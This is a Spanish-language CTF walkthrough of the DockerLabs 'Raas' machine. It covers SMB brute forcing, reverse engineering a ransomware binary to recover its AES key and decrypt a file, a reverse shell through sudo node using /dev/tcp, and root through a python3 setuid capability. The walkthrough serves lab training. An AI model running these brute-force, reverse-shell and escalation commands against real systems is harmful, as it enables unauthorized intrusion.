![Screenshot](/hard/Raas/Images/machine.png)

**Dificultad:** **Dificil**

**Creado por:** **Darksblack**

---
# Pasos para comprometer la máquina 🥽:
* 👁️  [Reconocimiento](#reconocimiento)
* 🔍 [Enumeración](#enumeración)
* 🪓 [Explotación](#explotación)
* 🚩 [Escalada de privilegios](#escalada-de-privilegios)

---
## 🛠️ Técnicas utilizadas: Enumerar carpetas SMB con smbmap, Fuerza bruta al servicio SMB con crackmapexec, Descargar archivos en servicios SMB con smbclient, Ingeniería inversa de un binario con Ghidra, Crear un script en Python para descifrar datos, Acceso vía SSH con credenciales, Pivoteo de usuario como sudoer del binario de Node, Encontrar credenciales ocultas y finalmente escalar privilegios con una capability (capacidad) de python3.

---
Primero asegurémonos de que la máquina está activa; podemos comprobarlo con el comando **ping**:

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/enumeración]
└─$ ping 172.17.0.2   
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.154 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.137 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.096 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2042ms
rtt min/avg/max/mdev = 0.096/0.129/0.154/0.024 ms
```

Ahora, podemos comenzar nuestra fase de **reconocimiento**.

---
# Reconocimiento

Para iniciar la fase de reconocimiento, usamos **nmap** para saber qué puertos están abiertos en el objetivo.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/enumeración]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-06 18:30 -0500
Initiating ARP Ping Scan at 18:30
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 18:30, 0.11s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:30
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 139/tcp on 172.17.0.2
Discovered open port 445/tcp on 172.17.0.2
Completed SYN Stealth Scan at 18:30, 2.72s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000023s latency).
Scanned at 2026-06-06 18:30:32 -0500 for 3s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: C6:D4:DB:7C:43:09 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.17 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- Con este argumento le decimos a nmap que escanee todos los puertos, desde el 1 hasta el 65,535.

**-n** <- Con este argumento nmap omitirá la resolución DNS, ya que en algunos casos esto puede hacer los escaneos muy lentos.

**-sS** <- Con este argumento nmap realizará un escaneo sigiloso (stealth), lo que significa que el *three-way-handshake* no se completará, haciendo el escaneo ligeramente más rápido.

**--min-rate 5000** <- Con este argumento nmap enviará al menos 5000 paquetes por segundo, haciendo el escaneo aún más rápido.

**-Pn** <- Con este argumento nmap omitirá la fase de descubrimiento de hosts, tratando la máquina como activa e iniciando el escaneo inmediatamente.

**-vv** <- Con este argumento nmap nos mostrará los puertos abiertos descubiertos mientras el escaneo continúa, informándonos en tiempo real.

**--open** <- Con este argumento le decimos a nmap que filtre y muestre solo los puertos abiertos.

Una vez que concluye el escaneo, podemos ver 3 puertos abiertos:

- Puerto 22 (ssh / Secure Shell)
- Puerto 139 (netbios / smb)
- Puerto 445 (microsoft-ds / smb)

Para saber más sobre estos puertos, como qué servicios y versiones se están ejecutando, podemos usar nmap una vez más.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/enumeración]
└─$ nmap -p22,139,445 -n -Pn -sCV 172.17.0.2 -oN target.txt --stats-every=1m
```

**-p22,139,445** <- Con este argumento nmap solo escaneará estos 3 puertos que descubrimos.

**-sCV** <- Con este argumento nmap escaneará la versión de cada puerto para encontrar posibles vulnerabilidades en sistemas desactualizados, y también ejecutará scripts adicionales para obtener más información.

**-oN target.txt** <- Con este argumento guardamos toda la salida de nmap en un archivo de texto normal.

**--stats-every=1m** <- Con este argumento queremos ver el estado del escaneo cada minuto.

Ahora, si vemos nuestro escaneo con **bat** (batcat), podemos ver esto:

```ruby
# Nmap 7.99 scan initiated Sat Jun  6 18:33:15 2026 as: /usr/lib/nmap/nmap --privileged -p22,139,445 -n -Pn -sCV -oN target.txt --stats-every=1m 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up (0.000070s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 07:ba:24:3e:67:86:71:2c:1c:f9:c2:65:0d:b0:f2:42 (ECDSA)
|_  256 e2:7a:9a:9d:58:2a:07:05:5f:e9:01:b6:7e:0d:e7:da (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: C6:D4:DB:7C:43:09 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-06-06T23:33:27
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun  6 18:33:32 2026 -- 1 IP address (1 host up) scanned in 17.45 seconds
```

---
# Enumeración

Podemos ver que los puertos 139 y 445 son **SMB**, por lo que podemos usar **enum4linux** para enumerar los servidores Samba así:

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/enumeración]
└─$ enum4linux 172.17.0.2 -a
```

**-a** <- Con este argumento queremos enumerar todo, como usuarios, carpetas compartidas, políticas de contraseña, etc.

Y podemos ver esto:

```r
 ==================================( Usuarios en 172.17.0.2 )========================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: patricio Name:   Desc: 
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: calamardo        Name:   Desc: 
index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: bob      Name:   Desc: 

user:[patricio] rid:[0x3e8]
user:[calamardo] rid:[0x3ea]
user:[bob] rid:[0x3e9]
```

Vemos 3 usuarios:
- patricio
- calamardo
- bob

Podemos guardar estos usuarios en un archivo txt.

También podemos ver las carpetas compartidas:

```r
 ==================================( Enumeración de Shares en 172.17.0.2 )==================================
                                                                                                                                                                                                                                              
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                                                                                                                                                         

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        ransomware      Disk      
        IPC$            IPC       IPC Service (dockerlabs server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 172.17.0.2                                                                                                                                                                                                    
                                                                                                                                                                                                                                              
//172.17.0.2/print$     Mapping: DENIED Listing: N/A Writing: N/A                                                                                                                                                                             
//172.17.0.2/ransomware Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                                                                                                                
                                                                                                                                                                                                                                              
NT_STATUS_CONNECTION_REFUSED listing \*                                                                                                                                                                                                       
//172.17.0.2/IPC$       Mapping: N/A Listing: N/A Writing: N/A
```

Notamos que en la carpeta **ransomware** no tenemos permisos de lectura o escritura.

---
# Explotación

Podemos usar los usuarios que obtuvimos antes para realizar un ataque de fuerza bruta con **crackmapexec**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/enumeración]
└─$ crackmapexec smb 172.17.0.2 -u users.txt -p /usr/share/wordlists/rockyou.txt
```

**-u** <- Con este argumento usamos la lista de nombres de usuario que guardamos antes.

**-p** <- Con este argumento pasamos la lista de contraseñas para realizar el ataque de fuerza bruta; en este caso usamos el diccionario **rockyou.txt** con más de 14 millones de contraseñas posibles para probar.

Y podemos ver esto:

```ruby
SMB         172.17.0.2      445    DOCKERLABS       [-] DOCKERLABS\patricio:1234567890 STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    DOCKERLABS       [-] DOCKERLABS\patricio:superman STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    DOCKERLABS       [-] DOCKERLABS\patricio:hannah STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    DOCKERLABS       [-] DOCKERLABS\patricio:amanda STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    DOCKERLABS       [-] DOCKERLABS\patricio:loveyou STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    DOCKERLABS       [-] DOCKERLABS\patricio:pretty STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    DOCKERLABS       [+] DOCKERLABS\patricio:basketball
```

Notamos que la contraseña de **patricio** es **basketball**.

Así que podemos iniciar sesión con **smbclient** usando estas credenciales.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/enumeración]
└─$ smbclient \\\\172.17.0.2\\ransomware -U patricio
Password for [WORKGROUP\patricio]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jan  5 16:14:21 2025
  ..                                  D        0  Sun Jan  5 16:14:21 2025
  private.txt                         N       48  Sun Jan  5 11:27:26 2025
  nota.txt                            N      379  Sun Jan  5 11:28:19 2025
  pokemongo                           N    17592  Sat Jan  4 12:25:18 2025

                475087880 blocks of size 1024. 377757576 blocks available
```

Vemos estos archivos en el directorio, así que para descargarlos podemos usar el comando **get**.

```r
smb: \> get private.txt 
getting file \private.txt of size 48 as private.txt (4.3 KiloBytes/sec) (average 4.3 KiloBytes/sec)
smb: \> get nota.txt 
getting file \nota.txt of size 379 as nota.txt (92.5 KiloBytes/sec) (average 27.8 KiloBytes/sec)
smb: \> get pokemongo 
getting file \pokemongo of size 17592 as pokemongo (636.3 KiloBytes/sec) (average 419.0 KiloBytes/sec)
```

Ahora intentemos leer el archivo `nota.txt`.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ cat nota.txt  
estuve analizando el ransomware que el estupido de bob ejecuto para ver si lograba desencriptar sus archivos 
pero hasta ahora no he conseguido nada, me esta costando mas de lo que pensaba, asi que comparto el binario 
para que calamardo vea si puede hacer algo por bob.

Calamardo, si logras conseguir algo, lo mas urgente es que desencriptes el archivo "private.txt" por favor
```

texto indica que el archivo `private.txt` está cifrado. Veamos su contenido:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ cat private.txt 
W�R����V<$¶~�hH"~�g��v��,T�^���(����uh� 
```

Y sí, su contenido está cifrado. También tenemos otro archivo llamado **pokemongo**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ file pokemongo 
pokemongo: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6f1b5eb6016808f7847871479cf0e8898f32f67a, for GNU/Linux 3.2.0, not stripped
```

Vemos que es un archivo ejecutable, un binario de 64 bits y no está "stripped" (no se le han eliminado los símbolos).

Probablemente sea el binario del ransomware que cifra los archivos. Podemos usar **checksec** para ver qué protecciones tiene este binario.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ checksec --file=pokemongo  
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   68 Symbols        No    0               4               pokemongo
```

Casi todas las protecciones están activas, excepto **Stack canary** (protección contra desbordamientos de búfer), la cual está desactivada.

Antes de ejecutarlo, hagamos un poco de ingeniería inversa con **Ghidra**:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ ghidra
```

Voy a editar las variables necesarias y entender completamente qué hace el binario.

Después de analizar el binario, este es su comportamiento:

- Verifica si el **hostname** de la máquina es igual a **dockerlabs**. Si NO, el binario sale.
- Verifica si existen los siguientes archivos: **/opt/ak.pk1** y **/bin/12bn**. Si ambos existen, el binario proced

Esta es la función Main:

```c

undefined8 main(void)

{
  int checker;
  undefined8 local_438;
  undefined8 local_430;
  undefined1 all_str [32];
  char host [1024];
  
  gethostname(host,1024);
  checker = strcmp(host,"dockerlabs");
  if (checker == 0) {
                    /* In case these files exists. */
    checker = file_exists("/opt/ak.pk1");
    if ((checker != 0) && (checker = file_exists("/bin/12bn"), checker != 0)) {
      recon(all_str);
      rand_str1 = 0x3837363534333231;
      rand_str2 = 0x3635343332313039;
      encrypt_files_in_directory("/home/",all_str,&rand_str1);
      return 0;
    }
    puts("Ten cuidado con lo que ejecutas!");
  }
  else {
    puts("Ten cuidado con lo que ejecutas!");
  }
  return 1;
}
```

Podemos ver que si los archivos existen van a llamar a la función **recon**, este es el codigo de la función:

```c

void recon(char *all_str)

{
  size_t str_length;
  
  builtin_strncpy(all_str,"y0qp",5);
  str_length = strlen(all_str);
  builtin_strncpy(all_str + str_length,"fjxbd",6);
  str_length = strlen(all_str);
  builtin_strncpy(all_str + str_length,"79047",6);
  str_length = strlen(all_str);
  builtin_strncpy(all_str + str_length,"929ew",6);
  str_length = strlen(all_str);
  builtin_strncpy(all_str + str_length,"0omqad3f",9);
  str_length = strlen(all_str);
  builtin_strncpy(all_str + str_length,"4gscl",6);
                    /* all_str = y0qpfjxbd79047929ew0omqad3f4gscl */
  return;
}
```

Esta función esta haciendo basicamente es construir un string, como podemos ver en el comentario.

Dentro de la función **encryt_files_in_directory** esta basicamente en leer el contenido del directorio home y por cada archivo del directorio verifica si es un archivo regular, si lo es, su contenido va ser encriptado por la función **encrypt**, en case de que el "archivo" sea un directorio, va ejecutar la misma función **encrypt_files_in_directory** en el.

Para hacerlo más fácil de entender, he hecho un gráfico del comportamiento del binario.

![Screenshot](/hard/Raas/Images/image1.png)

Las partes en cian son las importantes para nosotros, especialmente la parte de **encrypt**. Aquí está la función completa en código C:

```c
void encrypt(char *clear_data,int position_pointer)
{
  int checker;
  EVP_CIPHER *cipher;
  uchar *iv;
  uchar *key;
  uchar *buffer_space;
  int fp_location;
  int same_fp_loc;
  EVP_CIPHER_CTX *ctx_mode;
  
  ctx_mode = EVP_CIPHER_CTX_new();
  if (ctx_mode == (EVP_CIPHER_CTX *)0x0) {
    handleErrors();
  }
  cipher = EVP_aes_256_cbc();
                    /* Cipher mode = AES-256-CBC */
  checker = EVP_EncryptInit_ex(ctx_mode,cipher,(ENGINE *)0x0,key,iv);
  if (checker != 1) {
    handleErrors();
  }
  checker = EVP_EncryptUpdate(ctx_mode,buffer_space,&fp_location,(uchar *)clear_data,
                              position_pointer);
  if (checker != 1) {
    handleErrors();
  }
  same_fp_loc = fp_location;
  checker = EVP_EncryptFinal_ex(ctx_mode,buffer_space + fp_location,&fp_location);
  if (checker != 1) {
    handleErrors();
  }
  same_fp_loc = same_fp_loc + fp_location;
  EVP_CIPHER_CTX_free(ctx_mode);
  return;
}
```

Vemos que el modo de cifrado es **AES 256 CBC**, esto es importante saberlo muy bien. También vemos los argumentos **key** y **iv** en **EVP_EncryptInit_ex**. Esto significa que si obtenemos estos valores, podemos descifrar el archivo `private.txt`. Si te acuerdas, antes obtuvimos una cadena, así que probablemente sea la clave del cifrado porque necesita al menos 32 bytes de largo, y esta cadena cumple ese requisito.

¿Qué pasa con **iv**?

Probablemente que estas variables en `main` sea iv:
- `rand_str1 = 0x3837363534333231;`
- `rand_str2 = 0x3635343332313039;`

Estos valores hexadecimales podemos intentar decodificarlos. Podemos usar Python para hacerlo:

```python
>>> print(bytes.fromhex('3837363534333231').decode()[::-1])
12345678
>>> print(bytes.fromhex('3635343332313039').decode()[::-1])
90123456
```

Así que estos números hexadecimales están en *little endian*, por lo que necesitamos invertir la cadena con `[::-1]`. Si unimos estas cadenas, la longitud total es de 16 bytes, y para el valor IV esto también aplica.

Pero para asegurarnos de que estos valores son correctos, podemos intentar hacer un **punto de interrupción** con **GDB** para detenernos exactamente donde se llama a **EVP_EncryptInit_ex** y capturar la clave y el IV.

Necesitamos conocer las convenciones de llamada en los registros de Linux con esta función:

| función           | RDI      | RSI    | RDX    | RCX | r8  |
| ------------------ | -------- | ------ | ------ | --- | --- |
| EVP_EncryptInit_ex | ctx_mode | cipher | engine | key | iv  |

Así que podemos capturar la clave en el registro **RCX** y el **iv** en **r8** cuando el binario llama a la función **EVP_EncryptInit_ex**.

Para hacerlo, necesitamos:
1. Cambiar la instrucción de ensamblador al verificar nuestro *host* para saltarnos la restricción de "dockerlabs".
2. Crear esos dos archivos a **/opt/ak.pk1** y **/bin/12bn** para eludir y ejecutar el proceso de cifrado.

Vamos a empezar modificando la instrucción de ensamblador para hacer el salto incluso si el *host* no es "dockerlabs".

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ chmod +x pokemongo
```

Damos permiso de ejecución y hagamos una copia de seguridad si estropeamos el binario.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ cp pokemongo pokemongo.bkp
```

Ahora usemos **radare2** para ver las instrucciones de ensamblador.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ r2 pokemongo
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
[0x000011f0]>
```

Ahora escribamos **aaa** para analizar todo el binario y demos Enter.

```r
[0x000011f0]> aaa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
[0x000011f0]>
```

Ahora analicemos la función principal con **pdf@main** (print disassemble function main).

```r
[0x000011f0]> pdf@main
```

Y podemos ver esto:

![Screenshot](/hard/Raas/Images/image2.png)

Vemos que la dirección **0x000017d2** es donde se encuentra la instrucción de ensamblador que queremos modificar.

Para activar el modo de escritura escribimos el siguiente comando: **oo+** (abrir de nuevo el binario en modo lectura y escritura).

```r
[0x000011f0]> oo+
```

Ahora saltamos a la dirección **0x000017d2** con el comando **s** (mover puntero).

```r
[0x000011f0]> s 0x000017d2
[0x000017d2]>
```

Ok, modifiquemos la instrucción de ensamblador con **wa** (write assembly) y cambiemos `je` (jump equal) por `jne` (jump not equal).

```r
[0x000017d2]> wa jne 0x17ed
INFO: Written 2 byte(s) (jne 0x17ed) = wx 7519 @ 0x000017d2
```

Así que estamos haciendo algo como esto:

```c
if (host != "dockerlabs"){
	# continua...
}
```

Estamos cambiando el igual `==` por no igual `!=`, así que si nuestro *host* es diferente a "dockerlabs", continuaremos.

Ahora necesitamos crear esos archivos para eludir este modo de "seguridad" del binario. Podemos hacerlo con el comando **touch**:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ sudo touch /opt/ak.pk1
└─$ sudo touch /bin/12bn
```

Ahora ejecutemos el binario con **gdb**.

```c
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ gdb -q pokemongo
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 17.1 in 0.01ms using Python engine 3.13
Reading symbols from pokemongo...
(No debugging symbols found in pokemongo)
gef➤
```

Necesitamos desensamblar la función `encrypt` para ver dónde está la dirección para colocar el punto de interrupción.

```r
gef➤  disas encrypt
Dump of assembler code for function encrypt:
-----------
   
   0x0000000000001401 <+68>:    mov    r8,rcx
   0x0000000000001404 <+71>:    mov    rcx,rdx
   0x0000000000001407 <+74>:    mov    edx,0x0
   0x000000000000140c <+79>:    mov    rdi,rax
   0x000000000000140f <+82>:    call   0x1090 <EVP_EncryptInit_ex@plt>
   
-----------
```

Vemos que la instrucción `call` está ubicada ahí, así que pongamos el punto de interrupción en **encrypt+82**.

```r
gef➤  b*encrypt+82
Breakpoint 1 at 0x140f
```

Ahora ejecutemos el programa con **r**.

Y podemos ver esto:

![Screenshot](/hard/Raas/Images/image3.png)

Efectivamente, podemos ver que el registro **RCX** es la **key** y **r8** es el **iv**.

Si quieres comprobarlo, podemos usar **x/s** (examine string):

```r
gef➤  x/s $rcx
0x7fffffffd5b0: "y0qpfjxbd79047929ew0omqad3f4gscl"
gef➤  x/s $r8
0x7fffffffd5a0: "1234567890123456y0qpfjxbd79047929ew0omqad3f4gscl"
```

¡Espera! El IV parece tener la clave pegada al final. Probablemente el IV real es solo los primeros 16 bytes: `1234567890123456`.

Ahora tenemos todas las piezas necesarias para hacer un script de Python y descifrar el archivo `private.txt`.

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = b'y0qpfjxbd79047929ew0omqad3f4gscl'
iv = b'1234567890123456'
private_file = './private.txt'

def decipher():
    file = open(private_file, 'rb')
    encrypted = file.read()

    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    decrypted = unpad(cipher.decrypt(encrypted), AES.block_size).decode().strip()
    print('[!] Content of the file private.txt:')
    print('-'*40)
    print(decrypted)
    print('-'*40)

    with open('./decrypted_private.txt', 'w') as f: f.write(decrypted)
    print('[i] Decrypted content saved in [decrypted_private.txt]')

if __name__ == '__main__':
    decipher()
```

Quizás necesites instalar una librería de Python que es **pycryptodome**. Puedes instalarla con el siguiente comando:
- `pip install pycryptodome`

Si ejecutamos este script de Python, podemos ver esto:

```r
┌──(mike)─(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ python decrypter.py 
[!] Content of the file private.txt:
----------------------------------------
las credenciales ssh son: bob:[REDACTED]
----------------------------------------
[i] Decrypted content saved in [decrypted_private.txt]
```

¡Desciframos el archivo y también podemos ver las credenciales del usuario bob y su contraseña!

Ahora iniciemos sesión por SSH.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ ssh bob@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:2dbIR05zABWAIdh6CReawBuuFTKEUMfDmcJagHweik0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
bob@172.17.0.2's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.19.11+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
-bash: /home/bob/.profile: line 1: syntax error near unexpected token newline
bob@dockerlabs:~$
```

¡Ahora estamos dentro!

---
# Escalada de Privilegios

Si ejecutamos `sudo -l`, vemos esto:

```r
bob@dockerlabs:~$ sudo -l
Matching Defaults entries for bob on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on dockerlabs:
    (calamardo) NOPASSWD: /bin/node
```

Vemos que el usuario **calamardo** puede ejecutar el comando node, así que podemos hacer pivoteo de usuario con este privilegio.

Primero, hagamos que nuestra máquina esté en modo de escucha con **netcat** para recibir la shell inversa.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

- **-l**: Modo de escucha.
- **-v**: Modo verbose (detallado), esto nos va mostrar mas detalladamente información acerca de la conexión que vamos a recibir..
- **-n**: Sin resolución DNS, solo usa la dirección IP directamente.
- **-p**: Puerto a escuchar, puede ser cualquiera, si no esta siendo usada.

Ahora ejecutemos el comando node para hacer una shell inversa.

```r
bob@dockerlabs:~$ sudo -u calamardo node -e "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/172.17.0.1/1234 0>&1\"')"
```

**-e** <- Con este argumento le estamos diciendo a node que ejecute el siguiente comando.

**-c** <- Le estamos diciendo a bash que ejecute el siguiente comando.

**-i** <- Le estamos pidiendo a bash que haga una shell interactiva.

`>&` <- Estamos redirigiendo el **stderr** hacia al **stdout**.

**0>&1** <- Estamos redirigiendo el **stdin** hacia al **stdout**.

Recibimos esto en nuestro terminal de **netcat**:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 35398
calamardo@dockerlabs:/home/bob$ whoami
calamardo
```

Ahora necesitamos mejorar esta shell, es bastante fea.

Primero, hagamos esto:

```r
calamardo@dockerlabs:/home/bob$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

Este comando hace una nueva sesión de bash con **script** y **/dev/null** como el archivo de salida, porque script registra cada comando que ejecutamos en un log, pero con el path /dev/null, hacemos que log no registre los comandos, y **-c bash** hace que script corra la shell con bash.

Hacemos esto porque queremos usar CTRL + C y mas funciones de bash.

Luego suspendemos nuestra shell inversa momentáneamente con **CTRL + Z**.

En nuestra máquina de ataque ejecutamos:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ stty raw -echo; fg
```

Este comando stty va tratar la terminal.

**raw** <- Con raw estamos haciendo que todos los datos de salida y entrada sean crudos.

**-echo** <- Con esto estamos haciendo que si ejecutemos un comando, no va ser imprimido nuevamente en la salida.

**; fg** <- Y con esto traemos de vuelta nuestra reverse shell.

Cuando ejecutemos este comando, reiniciemos la terminal:

```r
reset xterm
```

Este comando va reiniciar la terminal.

Si queremos limpiar nuestra terminal, no podemos porque term va ser diferente de xterm, que este mismo tiene esta función. Podemos hacerlo de la siguiente manera para ser capaces de limpiar nuestra terminal si se pone sucia:

```r
calamardo@dockerlabs:/home/bob$ export TERM=xterm
```

Y por ultimo, podemos darnos cuenta de que la terminal es muy pequeña!

Podemos ajustar esto para hacerla mas grande con el siguiente comando:

```r
calamardo@dockerlabs:/home/bob$ stty rows {num} columns {num}
```

Ahora la terminal se ve mucho mejor. Intentemos movernos al usuario **patricio**.

Después de buscar formas de movernos a ese usuario, encontramos esto:

```c
calamardo@dockerlabs:~$ grep -r patricio
.bashrc:# should be on the output of commands, not on the prompt patricio:[REDACTED]
```

**-r** <- Con este argumento le estamos diciendo a grep que busque recursivamente.

Encontramos credenciales del usuario **patricio**. Probemos cambiar de usuario con `su`.

```r
calamardo@dockerlabs:~$ su patricio
Password: 
patricio@dockerlabs:/home/calamardo$
```

¡Genial! Ahora busquemos si podemos escalar privilegios.

Descubrimos que tenemos una **capability**.

```r
patricio@dockerlabs:~$ getcap -r / 2>/dev/null
/home/patricio/.ssh/python3 cap_setuid=ep
```

Vemos un binario de Python dentro del directorio home de `patricio`. Podemos cambiar nuestro UID (identificador de usuario) a 0 (root) con este binario de Python porque tenemos los permisos Effective y Permitted (`cap_setuid=ep`).

Así que ejecutamos el siguiente comando para convertirnos en el usuario root:

```c
patricio@dockerlabs:~$ .ssh/python3 -c 'import os; os.setuid(0); os.system("bash")'
root@dockerlabs:~# whoami
root
root@dockerlabs:~# id
uid=0(root) gid=1001(patricio) groups=1001(patricio),100(users)
```

Lo que hacemos es pedirle a Python que ejecute el comando `-c` y, después de cambiar nuestro UID a 0, generamos una shell `bash` con `os.system` para poder escribir comandos.

¡Ahora somos **root**! ***...pwned...!***
